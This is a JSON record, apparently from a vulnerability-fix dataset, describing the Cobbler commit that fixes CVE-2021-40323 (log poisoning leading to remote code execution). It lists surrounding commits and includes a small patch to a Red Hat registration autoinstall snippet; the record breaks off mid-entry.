{"index": 6678, "cve_id": "CVE-2021-40323", "cwe_id": ["CWE-94"], "cve_language": "Python", "cve_description": "Cobbler before 3.3.0 allows log poisoning, and resultant Remote Code Execution, via an XMLRPC method that logs to the logfile for template injection.", "cvss": "9.8", "publish_date": "October 4, 2021", "AV": "NETWORK", "AC": "NETWORK", "PR": "NONE", "UI": "NONE", "S": "UNCHANGED", "C": "HIGH", "I": "HIGH", "A": "HIGH", "commit_id": "d8f60bbf14a838c8c8a1dba98086b223e35fe70a", "commit_message": "Merge pull request #2794 from cobbler/fix/file-rce\n\nFix multiple security vulnerabilites", "commit_date": "2021-09-20T14:55:41Z", "project": "cobbler/cobbler", "url": "https://api.github.com/repos/cobbler/cobbler/commits/d8f60bbf14a838c8c8a1dba98086b223e35fe70a", "html_url": "https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a", "windows_before": [{"commit_id": "305678538610020a7a06707afaada2b6a09d7e63", "commit_date": "Mon Sep 13 15:12:59 2021 +0200", "commit_message": "Remove not existent check for disabled spacewalk registration", "files_name": ["autoinstall_snippets/redhat_register"]}, {"commit_id": "0dd11839d55cfe820f70abedc71adfd2e7937383", "commit_date": "Fri Aug 27 16:23:57 2021 +0200", "commit_message": "Tests: Add test for the upload_log_data method", "files_name": ["cobbler/remote.py", "tests/xmlrpcapi/miscellaneous_test.py"]}, {"commit_id": "a7deeef20ca96995f0e3765df1ecf00365037959", "commit_date": "Fri Aug 20 13:56:01 2021 +0200", "commit_message": "Security: Flag gate for modify_setting in XMLRPC", "files_name": ["cobbler/remote.py", "tests/xmlrpcapi/miscellaneous_test.py"]}, {"commit_id": "9ddc297a68bcd817fc6410805dd9dfc262b11fcb", "commit_date": "Wed Aug 18 15:43:47 2021 +0200", "commit_message": "Prevent general log poising", "files_name": ["cobbler/remote.py", "cobbler/validate.py"]}, {"commit_id": "d8ed0798e16ca00c681b0c0041b2e674e86d09eb", "commit_date": "Tue Aug 17 15:26:35 2021 +0200", "commit_message": "Tests: Automate the non-successful testing of the exploits we know of", "files_name": ["cobbler/api.py", "tests/actions/__init__.py", "tests/conftest.py", "tests/special_cases/__init__.py", "tests/special_cases/security_test.py"]}, {"commit_id": "ca06cae96626faac8c0c592a33c6d134a896bfb6", "commit_date": "Thu Aug 19 11:20:29 2021 +0200", "commit_message": "Safeguard XMLRPC against rce", "files_name": ["cobbler/api.py", "cobbler/remote.py", "cobbler/tftpgen.py", "cobbler/validate.py"]}, {"commit_id": "36c2ba149f8ba005ea30a94439562fd6fd4e9b67", "commit_date": "Mon Sep 20 14:40:51 2021 +0200", "commit_message": "Merge pull request #2792 from openSUSE/grub_fixes", "files_name": ["eb13229a6689c2178a1e1b41dbcab9f2845760c5 - Fri Sep 17 13:21:15 2021 +0200 : Ease up condition checking and do not add interfaces to dhcp6 without ipv6 address", "cobbler/modules/managers/isc.py"]}, {"commit_id": "98c070b86ceaa89e95ade55421597c49d9d39b8c", "commit_date": "Thu Sep 16 18:47:28 2021 +0200", "commit_message": "MAC address should already be properly formatted", "files_name": ["templates/etc/dhcp.template"]}, {"commit_id": "95761fb239fbdef32b9627602fddeaf1acbc55c3", "commit_date": "Thu Sep 16 12:38:54 2021 +0200", "commit_message": "Write message that initrd has successfully been loaded", "files_name": ["templates/boot_loader_conf/grub.template"]}, {"commit_id": "7423b042afc7a9161909e40bb2afe243fe2ef473", "commit_date": "Thu Sep 16 11:43:53 2021 +0200", "commit_message": "Set default menu if netboot is enabled", "files_name": ["templates/boot_loader_conf/grub.template"]}, {"commit_id": "05ad7c65eeed0abbfeb1ed8c23cdc86275325b28", "commit_date": "Thu Sep 16 11:28:03 2021 +0200", "commit_message": "Use the grub formatted tftp URL in for loading kernel/initrd remotely", "files_name": ["cobbler/items/distro.py", "cobbler/tftpgen.py", "tests/items/distro_test.py"]}, {"commit_id": "7827a155336f4ff0f6238d5e422843827fcde261", "commit_date": "Mon Sep 20 12:59:25 2021 +0200", "commit_message": "Merge pull request #2793 from openSUSE/log_fixes_2", "files_name": ["04de6b80d2370890c10e7e4e0f8b9e8b2c5332b8 - Sun Sep 19 23:09:30 2021 +0200 : Decrease log output", "cobbler/api.py", "cobbler/grub.py", "cobbler/remote.py", "cobbler/utils.py"]}, {"commit_id": "5639a3afdb379bd0631fdce9ad494ed98479b7f3", "commit_date": "Fri Sep 17 13:50:32 2021 +0200", "commit_message": "Merge pull request #2791 from cobbler/fix/autoinstall-manager", "files_name": ["c966bacedb0c908c0e062707b51be93a4c2cebc1 - Fri Sep 17 10:50:31 2021 +0200 : Merge pull request #2785 from cobbler/types-for-api", "68617edf3192d9fa3a47729dd08012ed3a7cd1e4 - Fri Sep 10 22:21:24 2021 +0200 : Add types to various files", "cobbler/actions/acl.py", "cobbler/actions/report.py", "cobbler/actions/reposync.py", "cobbler/actions/status.py", "cobbler/api.py", "cobbler/cobbler_collections/collection.py", "cobbler/modules/authorization/configfile.py", "cobbler/modules/authorization/ownership.py", "cobbler/remote.py", "cobbler/tftpgen.py", "cobbler/utils.py", "tests/api/sync_test.py"]}, {"commit_id": "ef6e62766c3838cd62ce9d8edbd412c605a62353", "commit_date": "Thu Sep 16 11:41:58 2021 +0200", "commit_message": "Autoinstall Manager: Fix utils.die calls and removed unused variable", "files_name": ["cobbler/autoinstall_manager.py"]}, {"commit_id": "54570c2bcb0d2955bdbf7f1067ec56515e876b6e", "commit_date": "Wed Sep 15 12:56:09 2021 +0200", "commit_message": "Merge pull request #2788 from cobbler/docs/add-mkgrub", "files_name": ["44b99700246d8d98c6347a7675748a096cb8d756 - Wed Sep 15 11:22:21 2021 +0200 : Docs: Add the mkgrub command to the CLI", "docs/cobbler.rst"]}, {"commit_id": "e9c06f6e42b49b6a0ccf636677f0c7e3134c54f6", "commit_date": "Wed Sep 15 08:44:04 2021 +0200", "commit_message": "Create FUNDING.yml", "files_name": [".github/FUNDING.yml"]}, {"commit_id": "8376db9c5856ff94f0f0c33da5f806b47ec9d5f6", "commit_date": "Tue Sep 14 09:37:37 2021 +0200", "commit_message": "Merge pull request #2739 from agraul/mkgrub-python", "files_name": ["ba1884d7226e3e4f2943c53e702b2d28281e1d2a - Tue Sep 14 08:44:36 2021 +0200 : Addressed review suggestions by @nodeg", "cobbler/actions/grubimage.py", "cobbler/api.py", "cobbler/settings/migrations/V3_3_0.py"]}, {"commit_id": "550c5bfec20457b7891c4f99d20957c9f71db6b2", "commit_date": "Mon Sep 13 18:44:06 2021 +0200", "commit_message": "Merge pull request #2780 from openSUSE/spec_license", "files_name": ["55424736ef7d8e0beff39561040b5298f2558668 - Mon Sep 13 12:23:55 2021 +0200 : Calm down OBS build checker", "cobbler.rpmlintrc"]}, {"commit_id": "7c76844bbb1d0325a148c5beb77ac542479d6173", "commit_date": "Mon Sep 13 15:56:20 2021 +0200", "commit_message": "Add docstring to new API method", "files_name": ["cobbler/api.py"]}, {"commit_id": "eae625ea0bbf8cb70e3b63a5e31d6881ffe69ac5", "commit_date": "Mon Sep 13 15:49:19 2021 +0200", "commit_message": "Tests: Test object creation and test grubimage run", "files_name": ["tests/actions/grubimage_test.py"]}, {"commit_id": "c5ca190b59b7cf55db580f05392bc9e643437a23", "commit_date": "Fri Aug 27 16:57:32 2021 +0200", "commit_message": "Added new keys to the migration module for 3.3.0", "files_name": ["cobbler/settings/migrations/V3_3_0.py", "tests/settings/migrations/migrations_test.py", "tests/test_data/V3_3_0/settings.yaml"]}, {"commit_id": "926e08e125aa3915927da92d88d81cb5a7f300ad", "commit_date": "Mon Sep 13 15:19:13 2021 +0200", "commit_message": "Merge pull request #2784 from cobbler/fix/pxe-just-once", "files_name": ["e9261d20e9c94c6d2283533bc76304e6d2b0efa8 - Wed Sep 8 13:13:35 2021 +0200 : spec file needs an open source license header to be build in open build service", "cobbler.spec"]}, {"commit_id": "0e389273a2122d163a1da9eb4c8ce3d43ccf1a4a", "commit_date": "Sat Sep 11 11:15:05 2021 +0200", "commit_message": "Merge pull request #2773 from cobbler/fix/items_docstrings", "files_name": ["774963f3d1fb8e418fd4e36f294af9f2e9f00911 - Fri Sep 10 16:42:38 2021 +0200 : This uses a real boolean instead of a one converted to a str", "autoinstall_snippets/autoinstall_done", "autoinstall_snippets/autoinstall_start"]}, {"commit_id": "0fd777cb77a18408c42e4fb4aa4cd4c66b1392e2", "commit_date": "Fri Sep 10 16:34:45 2021 +0200", "commit_message": "Fix test which needs to be adjusted for now working code", "files_name": ["tests/items/profile_test.py"]}, {"commit_id": "d73b9ef1773f7173f5c7485c5394e276ac613870", "commit_date": "Fri Sep 10 16:23:35 2021 +0200", "commit_message": "Finish system.py", "files_name": ["cobbler/items/system.py"]}, {"commit_id": "f975665ad40fa0b8e24f7edbd703a433a22a2800", "commit_date": "Fri Sep 10 13:57:05 2021 +0200", "commit_message": "Start with system.py", "files_name": ["cobbler/items/system.py"]}, {"commit_id": "4152e772ad7a55489d7e18319d5a582604858c52", "commit_date": "Fri Sep 10 09:49:14 2021 +0200", "commit_message": "Fixup image.py", "files_name": ["cobbler/items/image.py"]}, {"commit_id": "b56ac1b1c81d98d3f692dab1a81523d6811cd41e", "commit_date": "Fri Sep 10 09:49:06 2021 +0200", "commit_message": "Finish profile.py", "files_name": ["cobbler/items/profile.py"]}, {"commit_id": "fea47ae77ad49f4c9695c5ab0ed4da079f7857ac", "commit_date": "Thu Sep 9 16:48:04 2021 +0200", "commit_message": "Progress with profile.py", "files_name": ["cobbler/items/profile.py"]}, {"commit_id": "1bfdf8f869f8c5ce4e39436e0ac7f44bdf978b6f", "commit_date": "Thu Sep 9 15:08:17 2021 +0200", "commit_message": "Finish distro.py", "files_name": ["cobbler/items/distro.py"]}, {"commit_id": "1f50ed35a446d0718654906dd5017044b7e9e27e", "commit_date": "Thu Sep 9 10:18:28 2021 +0200", "commit_message": "Finish image.py", "files_name": ["cobbler/items/image.py"]}, {"commit_id": "2e625af02ba4f71171421bc0a022cc9fb76d67b3", "commit_date": "Thu Sep 9 09:24:30 2021 +0200", "commit_message": "Finish repo.py", "files_name": ["cobbler/items/repo.py"]}, {"commit_id": "72f8994582102b0308fc456e6f1afd9eb0322266", "commit_date": "Wed Sep 8 18:07:14 2021 +0200", "commit_message": "More tmp", "files_name": ["cobbler/items/distro.py", "cobbler/items/image.py", "cobbler/items/profile.py", "cobbler/items/repo.py", "cobbler/items/system.py"]}, {"commit_id": "ff01d45d73d80eed7993a38e3b8622f280df7659", "commit_date": "Mon Sep 6 09:32:20 2021 +0200", "commit_message": "Merge pull request #2775 from jadiunr/onboot-disable-when-quoted-value", "files_name": ["1901d738b72662b3a2f6b9d936d26408c799f660 - Fri Sep 3 14:09:17 2021 +0900 : Disable ONBOOT when quoted", "autoinstall_snippets/post_install_network_config"]}, {"commit_id": "a6dbeafe3bf39cd931691d5e83f670bac664eb4b", "commit_date": "Tue Aug 31 18:56:30 2021 +0200", "commit_message": "Tmp commit", "files_name": ["cobbler/items/distro.py", "cobbler/items/file.py", "cobbler/items/image.py", "cobbler/items/mgmtclass.py", "cobbler/items/package.py", "cobbler/items/profile.py", "cobbler/items/repo.py", "cobbler/items/system.py"]}, {"commit_id": "5bcbfaca96f026f7f46814e3ae507f7ca0b4ba48", "commit_date": "Tue Aug 31 18:55:56 2021 +0200", "commit_message": "docstring item.py", "files_name": ["cobbler/items/item.py"]}, {"commit_id": "565c168479614d43e3a35267ef143e2882923281", "commit_date": "Tue Aug 31 17:49:32 2021 +0200", "commit_message": "Tmp", "files_name": ["cobbler/items/item.py"]}, {"commit_id": "6a184b3bb7a29e9df668b78b2907df50526b9fb8", "commit_date": "Tue Aug 31 18:06:16 2021 +0200", "commit_message": "docstring resource.py", "files_name": ["cobbler/items/resource.py"]}, {"commit_id": "6e9c7ef9ebf8f02ddc16df0306bcefaf19c3dd4d", "commit_date": "Tue Aug 31 17:57:37 2021 +0200", "commit_message": "docstring package.py", "files_name": ["cobbler/items/package.py"]}, {"commit_id": "31a4b7fe8ac7fc9dac3e94bea4d09d128d9fd35b", "commit_date": "Tue Aug 31 17:53:52 2021 +0200", "commit_message": "docstring mgmtclass.py", "files_name": ["cobbler/items/mgmtclass.py"]}, {"commit_id": "79a8de83d4ad51a36d817b3a543c3574ffd0cee8", "commit_date": "Tue Aug 31 17:43:47 2021 +0200", "commit_message": "Docstring menu.py", "files_name": ["cobbler/items/menu.py"]}, {"commit_id": "a5b487e28a01dc775a5c6a3c2de0c695c7e54800", "commit_date": "Tue Aug 31 16:33:29 2021 +0200", "commit_message": "Docstring changes", "files_name": ["cobbler/items/file.py"]}, {"commit_id": "af118f5200baaa08e75183cd43b295a7e2be64a4", "commit_date": "Tue Aug 31 17:33:41 2021 +0200", "commit_message": "Merge pull request #2774 from cobbler/feature/hardlink-configurable", "files_name": ["e65a1c7cbdae742c56891f446bde7b3470feb559 - Tue Aug 31 17:14:20 2021 +0200 : Refactor the hardlink command to support non default web directories.", "cobbler/actions/hardlink.py", "cobbler/api.py", "cobbler/utils.py"]}, {"commit_id": "ede4be4f533094356d693c313dcdc7cb197e7731", "commit_date": "Tue Aug 31 16:18:08 2021 +0200", "commit_message": "Merge pull request #2772 from cobbler/fix/cobbler-settings", "files_name": ["11c885fc8be61dd7f25ea2546f3a220e8e47c4a9 - Tue Aug 31 16:02:53 2021 +0200 : Cobbler-settings: Change options order", "bin/cobbler-settings"]}, {"commit_id": "e1e245e5e2a1d06bac4fe0ef6409644fa8381072", "commit_date": "Tue Aug 31 13:58:30 2021 +0200", "commit_message": "Merge pull request #2771 from cobbler/fix/docs", "files_name": ["3b6743562bd18900c2f299df2dc6a36c61dfd0ab - Tue Aug 31 12:00:12 2021 +0200 : docs: Fix docstrings and logger formatting", "cobbler/actions/acl.py", "cobbler/api.py", "cobbler/autoinstall_manager.py", "cobbler/autoinstallgen.py", "cobbler/cli.py"]}], "windows_after": [{"commit_id": "99f7eeb8d34df76ae26b8fd6ca099b41ea71687e", "commit_date": "Wed Sep 22 10:40:17 2021 +0200", "commit_message": "Merge pull request #2799 from cobbler/increment-version-to-3-3-1", "files_name": ["8264d7c21b8331ce4902c52395b4fa1cc6346b56 - Wed Sep 22 14:39:03 2021 +0200 : Docker: Remove simplejson from scripts", "docker/debs/Debian_10/Debian10.dockerfile", "docker/debs/build-and-install-debs.sh", "docker/debs/install-debs.sh", "docker/rpms/CentOS_8/CentOS8.dockerfile", "docker/rpms/Fedora_34/Fedora34.dockerfile", "docker/rpms/build-and-install-rpms.sh", "docker/rpms/install-rpms.sh", "docker/rpms/opensuse_leap/openSUSE_Leap153.dockerfile", "docker/rpms/opensuse_tumbleweed/openSUSE_TW.dockerfile"]}, {"commit_id": "8157f390154dafa71d0f2f28e16348d310affde0", "commit_date": "Wed Sep 22 14:55:18 2021 +0200", "commit_message": "Docker: Add bootloaders to the devel container", "files_name": ["docker/develop/develop.dockerfile"]}, {"commit_id": "2c59792ed2bcec7448fe0a7b8f045122dbcc64b3", "commit_date": "Wed Sep 22 16:02:10 2021 +0200", "commit_message": "Docker: Add scripts directory to PATH", "files_name": ["docker/develop/develop.dockerfile"]}, {"commit_id": "9a4b085320b84f041fb9407abee2860e309f900c", "commit_date": "Fri Sep 24 13:50:14 2021 +0200", "commit_message": "Merge pull request #2806 from cobbler/devel/improve-docker-image", "files_name": ["e8f779cd442b306cd4d6240b7429192ac475db10 - Wed Sep 15 15:56:29 2021 +0200 : Fix defaults and path to the ipxe files", "cobbler/actions/grubimage.py", "cobbler/remote.py"]}, {"commit_id": "f66cf2fb3804d93264cec83e240e28663e3ea733", "commit_date": "Wed Sep 22 16:01:35 2021 +0200", "commit_message": "cobbler mkgrub: Create managed directories", "files_name": ["cobbler/actions/grubimage.py"]}, {"commit_id": "febac57f9903e1e2e2d107a008eebf57616dae60", "commit_date": "Fri Sep 24 15:34:01 2021 +0200", "commit_message": "Docker: Add GRUB2 ARM EFI modules", "files_name": ["docker/develop/develop.dockerfile"]}, {"commit_id": "53bc24b0478efecd91b8c0b39e685921ef6da067", "commit_date": "Fri Sep 24 15:35:12 2021 +0200", "commit_message": "mkgrub: Apply opinionated formatting", "files_name": ["cobbler/actions/grubimage.py"]}, {"commit_id": "8fb3198445ba8aa902bf6fee82ad260b23b268cb", "commit_date": "Fri Sep 24 15:38:27 2021 +0200", "commit_message": "mkgrub: Improve bootloader building process", "files_name": ["cobbler/actions/grubimage.py", "tests/actions/grubimage_test.py"]}, {"commit_id": "8d11a6d97c622a18f6aba6000459e58db4105f3e", "commit_date": "Fri Sep 24 15:48:58 2021 +0200", "commit_message": "Tests: Adjust to new mkgrub code", "files_name": ["tests/actions/grubimage_test.py"]}, {"commit_id": "ad1378da99831af26ba397be7c5ac8d8bc975fea", "commit_date": "Fri Sep 24 20:38:45 2021 -0500", "commit_message": "Added new unit test for tftpgen.py", "files_name": ["tests/test_data/dummy_bootloaders/bootloader1", "tests/test_data/dummy_bootloaders/bootloader2", "tests/tftpgen_test.py"]}, {"commit_id": "525fd94e35e3193d5627c9e718be85ded1e71499", "commit_date": "Fri Sep 24 20:40:50 2021 -0500", "commit_message": "Reworded comment", "files_name": ["tests/tftpgen_test.py"]}, {"commit_id": "b8817b2d4b54a03df966de389981457fd4f87632", "commit_date": "Fri Sep 24 20:48:23 2021 -0500", "commit_message": "Corrected a tiny typo", "files_name": ["docs/cobbler-conf.rst"]}, {"commit_id": "c6646cba94c8bf1f68b872dc6af5e0d7be85826d", "commit_date": "Mon Sep 27 14:12:00 2021 +0200", "commit_message": "Exclude ourselves from duplicate checks for ip/mac/dns duplicates", "files_name": ["cobbler/items/system.py"]}, {"commit_id": "e88f12b086ced3d68f2cbe6894671ffa7de473d7", "commit_date": "Mon Sep 27 14:16:36 2021 +0200", "commit_message": "Introduce new serialize_one_item function", "files_name": ["cobbler/cobbler_collections/collection.py", "cobbler/cobbler_collections/manager.py"]}, {"commit_id": "331b08242cfea233fcee0b4e46ae78ae7a8dd9cb", "commit_date": "Mon Sep 27 14:20:09 2021 +0200", "commit_message": "Remove check_for_duplicate_netinfo parameter checking, this is done in interface setter now", "files_name": ["cobbler/api.py", "cobbler/cobbler_collections/collection.py"]}, {"commit_id": "7b4333cc908e63ae7a8e2aa2a347303e5f6cdbc8", "commit_date": "Mon Sep 27 14:35:51 2021 +0200", "commit_message": "Use newly introduce per item serializer on parent/profile addings", "files_name": ["cobbler/cobbler_collections/collection.py", "cobbler/cobbler_collections/profiles.py", "cobbler/cobbler_collections/systems.py", "cobbler/items/profile.py", "cobbler/items/system.py"]}, {"commit_id": "2858ffd3734d489367f6ad9630f5fceaa3a78e54", "commit_date": "Mon Sep 27 14:47:46 2021 +0200", "commit_message": "No need to log directory creation", "files_name": ["cobbler/utils.py"]}, {"commit_id": "f8a8a0c3b0d981709fc0275a76d0b20065311891", "commit_date": "Mon Sep 27 15:45:32 2021 -0500", "commit_message": "Reworked arangement section to use shutils module instead of a straight cp command", "files_name": ["tests/tftpgen_test.py"]}, {"commit_id": "f1502c17808e405ac8b5373ea139f8f53a240b69", "commit_date": "Wed Sep 22 17:11:18 2021 +0200", "commit_message": "Show startup time in seconds if python3-psutil is installed", "files_name": ["cobbler/cobblerd.py"]}, {"commit_id": "14c508b9bff126c1b56dee1de61f130af24a9e17", "commit_date": "Wed Sep 22 17:18:16 2021 +0200", "commit_message": "Downgrade info to debug message when loading systems", "files_name": ["cobbler/items/system.py"]}, {"commit_id": "4a7f5ea6f8ee4d21bff6b7f015de0fd8fb1129a7", "commit_date": "Tue Sep 28 11:14:30 2021 +0200", "commit_message": "mkgrub: Use grub subdirectory for storing binary executables", "files_name": ["cobbler/actions/grubimage.py"]}, {"commit_id": "230cd82e578035050210d856500f7740335bc703", "commit_date": "Tue Sep 28 11:46:33 2021 +0200", "commit_message": "mkgrub: Rename file and class to mkloaders", "files_name": ["cobbler/actions/mkloaders.py", "cobbler/api.py", "cobbler/cli.py", "cobbler/remote.py", "config/bash/completion/cobbler", "tests/actions/mkloaders_test.py"]}, {"commit_id": "22f357fe81f2adf849d5fc66c903eb2209927cf2", "commit_date": "Tue Sep 28 14:30:24 2021 +0200", "commit_message": "mkloaders: Add checks for required components", "files_name": ["cobbler/actions/mkloaders.py", "cobbler/utils.py"]}, {"commit_id": "6eb6b8b7072dbd34c63fe42d648726b9c5b28fc5", "commit_date": "Tue Sep 28 14:57:41 2021 +0200", "commit_message": "Tests: Implement new mkloaders tests", "files_name": ["config/cobbler/settings.yaml", "tests/actions/mkloaders_test.py", "tests/utils_test.py"]}, {"commit_id": "fb1bd3b05426a89004a6ab51db82548a27c0be9d", "commit_date": "Tue Sep 28 15:33:23 2021 +0200", "commit_message": "Tests: Mock dependency for syslinux", "files_name": ["tests/actions/mkloaders_test.py"]}, {"commit_id": "0026628c5024cdc049c02cfe4e0668fc2210f025", "commit_date": "Wed Sep 29 09:19:26 2021 +0200", "commit_message": "Simplify command_exists functionality", "files_name": ["cobbler/actions/mkloaders.py", "cobbler/utils.py", "tests/utils_test.py"]}, {"commit_id": "64e4353f651e464a4a9d89b8800f2d8aa9341d05", "commit_date": "Wed Sep 29 10:27:26 2021 +0200", "commit_message": "fix: OBS build in pull requests", "files_name": [".obs/workflows.yml"]}, {"commit_id": "fc5752d39420cdc5ee4e2764f13932364e65943a", "commit_date": "Wed Sep 29 11:05:00 2021 +0200", "commit_message": "Docker: Remove package updates", "files_name": ["docker/rpms/opensuse_leap/openSUSE_Leap153.dockerfile", "docker/rpms/opensuse_tumbleweed/openSUSE_TW.dockerfile"]}, {"commit_id": "1f61db57131bc9a3ad548c56cefa1dbecd23b86a", "commit_date": "Wed Sep 29 11:43:41 2021 +0200", "commit_message": "Docs: Fixup docstrings of mkloaders", "files_name": ["cobbler/actions/mkloaders.py", "cobbler/utils.py"]}, {"commit_id": "a3f07ab9d62c755f432bf2b3b97ad6f010d48c3a", "commit_date": "Wed Sep 29 11:47:04 2021 +0200", "commit_message": "Update cobbler/cobblerd.py", "files_name": ["cobbler/cobblerd.py"]}, {"commit_id": "70cb0305a40e59f08979dabb6b23df75a50bb6a4", "commit_date": "Wed Sep 29 11:47:11 2021 +0200", "commit_message": "Update cobbler/items/system.py", "files_name": ["cobbler/items/system.py"]}, {"commit_id": "46ab52266ca983bd5aa642411c10bf9c5d9a0cbf", "commit_date": "Wed Sep 29 13:30:25 2021 +0200", "commit_message": "Tests: Add tests for the distro collection", "files_name": ["tests/collections/__init__.py", "tests/collections/conftest.py", "tests/collections/distro_collection_test.py"]}, {"commit_id": "4f91a400f957ab1afae3f3332efc89e9b3066198", "commit_date": "Wed Sep 29 13:30:51 2021 +0200", "commit_message": "Collections: Simplify the duplication checks", "files_name": ["cobbler/cobbler_collections/collection.py"]}, {"commit_id": "8ca79aa9196667d19193901d67877f99ae8adc26", "commit_date": "Wed Sep 29 13:40:05 2021 +0200", "commit_message": "Merge pull request #2810 from cobbler/fix_obs", "files_name": ["8e0952f8d255752d5c86272a2000daf4a1db9f0f - Wed Sep 29 16:40:12 2021 +0200 : Merge pull request #2809 from openSUSE/check_enhancements", "c51fc3c704a34d7760c43b619a7ac76e19e552fe - Wed Sep 29 13:46:50 2021 +0200 : mkloaders: Fixup order of the symlinks", "cobbler/actions/mkloaders.py"]}, {"commit_id": "1ba65fcf6b996a90d0ec795c8766a957e86fa598", "commit_date": "Wed Sep 29 16:58:28 2021 +0200", "commit_message": "Merge pull request #2807 from cobbler/fix/mkgrub-action", "files_name": ["996d7eb918bfaa190fd89b465a2ef2dec57abee2 - Tue Oct 5 01:06:16 2021 +0300 : Do not warn users about missing files during removal", "cobbler/utils.py"]}, {"commit_id": "c81caf36d50f9de908b366bc11d429ef15615e49", "commit_date": "Tue Oct 5 09:12:35 2021 +0200", "commit_message": "Merge pull request #2813 from heroin-moose/fix-rmfile", "files_name": ["f11e22527f67dd213c4f98895d3ec2776d90ac8a - Tue Oct 5 22:59:53 2021 -0500 : Update test to use tmpdir fixture", "tests/tftpgen_test.py"]}, {"commit_id": "59c0dfa7b67e7912cb087e957ec8594c998fb588", "commit_date": "Tue Oct 5 23:01:30 2021 -0500", "commit_message": "Removed no longer needed test files", "files_name": ["tests/test_data/dummy_bootloaders/bootloader1", "tests/test_data/dummy_bootloaders/bootloader2"]}, {"commit_id": "2be3275e5570b8fe4cdc203aae3942ec01117170", "commit_date": "Wed Oct 6 10:57:27 2021 +0200", "commit_message": "Fixed python3-magic dependency for RHEL", "files_name": ["cobbler.spec"]}, {"commit_id": "4246f6a77df723d7d9b565ad85d2f13067e5726c", "commit_date": "Wed Oct 6 13:20:41 2021 +0200", "commit_message": "Merge pull request #2816 from sbluhm/python3-magic-fix", "files_name": ["f6d59bf584291645d9b121e3867faec5e5f2674a - Sun Oct 10 10:37:34 2021 +0200 : Merge pull request #2808 from ericchambers1940/master", "2de6a1e62ea15265c4019853fc934d8a98db454e - Sun Oct 10 14:29:16 2021 +0300 : Add support for Windows 11", "cobbler/modules/managers/import_signatures.py", "config/cobbler/distro_signatures.json", "docs/user-guide/wingen.rst"]}, {"commit_id": "036eec591c6023e7ef5dadcde7277837b746b304", "commit_date": "Sun Oct 10 23:22:14 2021 +0300", "commit_message": "fix import", "files_name": ["cobbler/modules/managers/import_signatures.py"]}, {"commit_id": "c1d81950d4e3a1dc01758f65d37d0851b64751f5", "commit_date": "Mon Oct 11 09:15:21 2021 +0200", "commit_message": "Merge pull request #2819 from tpw56j/master", "files_name": ["63a4b0d95478698dbb8042619c5261cf8c39deb9 - Sun Oct 17 21:25:01 2021 +0300 : Add system tests", "system-tests/.gitignore", "system-tests/images/fake/initramfs", "system-tests/images/fake/vmlinuz", "system-tests/prelude", "system-tests/run-tests", "system-tests/tests/basic-distro-add-remove", "system-tests/tests/basic-distro-rename", "system-tests/tests/basic-inheritance", "system-tests/tests/basic-profile-add-remove", "system-tests/tests/basic-profile-rename", "system-tests/tests/basic-system-add-remove", "system-tests/tests/basic-system-rename"]}, {"commit_id": "3250de19356fbd4eef0c8cbba58577a901dc5eba", "commit_date": "Sun Oct 17 21:48:59 2021 +0300", "commit_message": "system-tests: Check distribution importing", "files_name": ["system-tests/listings/redhat-rhel8/Rocky-8.4-x86_64-minimal.iso", "system-tests/run-tests", "system-tests/scripts/list-iso", "system-tests/tests/import-@", "system-tests/tests/import-redhat-rhel8"]}, {"commit_id": "0e0c155e24dc179b2b438f0f1cf76077f44065da", "commit_date": "Sun Oct 17 22:22:58 2021 +0300", "commit_message": "system-tests: Check Grub autoinstall", "files_name": ["system-tests/images/dummy/Makefile", "system-tests/images/dummy/initramfs/bin/.gitignore", "system-tests/images/dummy/initramfs/etc/udhcpc.bound", "system-tests/images/dummy/initramfs/etc/udhcpc.deconfig"]}], "parents": [{"commit_id_before": "36c2ba149f8ba005ea30a94439562fd6fd4e9b67", "url_before": "https://api.github.com/repos/cobbler/cobbler/commits/36c2ba149f8ba005ea30a94439562fd6fd4e9b67", "html_url_before": "https://github.com/cobbler/cobbler/commit/36c2ba149f8ba005ea30a94439562fd6fd4e9b67"}, {"commit_id_before": "452e47142b24d79fbfc93199594be75e84caa54a", "url_before": "https://api.github.com/repos/cobbler/cobbler/commits/452e47142b24d79fbfc93199594be75e84caa54a", "html_url_before": "https://github.com/cobbler/cobbler/commit/452e47142b24d79fbfc93199594be75e84caa54a"}], "details": [{"raw_url": "https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/autoinstall_snippets%2Fredhat_register", "code": "# begin Red Hat management server registration\n#if $redhat_management_key != \"\"\nmkdir -p /usr/share/rhn/\n   #if $redhat_management_type == \"site\"\n      #set $mycert_file = \"RHN-ORG-TRUSTED-SSL-CERT\"\n      #set $mycert = \"/usr/share/rhn/\" + $mycert_file\ncurl http://$redhat_management_server/pub/RHN-ORG-TRUSTED-SSL-CERT -o $mycert\nperl -npe 's/RHNS-CA-CERT/$mycert_file/g' -i /etc/sysconfig/rhn/*\n   #end if\n   #if $redhat_management_type == \"hosted\"\n      #set $mycert = \"/usr/share/rhn/RHNS-CA-CERT\"\n   #end if \n   #set $endpoint = \"https://%s/XMLRPC\" % $redhat_management_server\nrhnreg_ks --serverUrl=$endpoint --sslCACert=$mycert --activationkey=$redhat_management_key\n#else\n# not configured to register to any Red Hat management server (ok)\n#end if\n# end Red Hat management server registration\n", "code_before": "# begin Red Hat management server registration\n#if $redhat_management_key != \"\"\nmkdir -p /usr/share/rhn/\n   #if $redhat_management_type == \"site\"\n      #set $mycert_file = \"RHN-ORG-TRUSTED-SSL-CERT\"\n      #set $mycert = \"/usr/share/rhn/\" + $mycert_file\ncurl http://$redhat_management_server/pub/RHN-ORG-TRUSTED-SSL-CERT -o $mycert\nperl -npe 's/RHNS-CA-CERT/$mycert_file/g' -i /etc/sysconfig/rhn/*\n   #end if\n   #if $redhat_management_type == \"hosted\"\n      #set $mycert = \"/usr/share/rhn/RHNS-CA-CERT\"\n   #end if \n   #set $endpoint = \"https://%s/XMLRPC\" % $redhat_management_server\nrhnreg_ks --serverUrl=$endpoint --sslCACert=$mycert --activationkey=$redhat_management_key\n#else\n# not configured to register to any Red Hat management server (ok)\n#end if\n# end Red Hat management server registration\n", "patch": "@@ -1,5 +1,5 @@\n # begin Red Hat management server registration\n-#if $redhat_management_type != \"off\" and $redhat_management_key != \"\"\n+#if $redhat_management_key != \"\"\n mkdir -p /usr/share/rhn/\n    #if $redhat_management_type == \"site\"\n       #set $mycert_file = \"RHN-ORG-TRUSTED-SSL-CERT\"", "file_path": "files/2021_10/1104", "file_language": "autoinstall_snippets/redhat_register", "file_name": "autoinstall_snippets/redhat_register", "outdated_file_modify": 0, "outdated_file_before": 1, "outdated_file_after": 0}, {"raw_url": 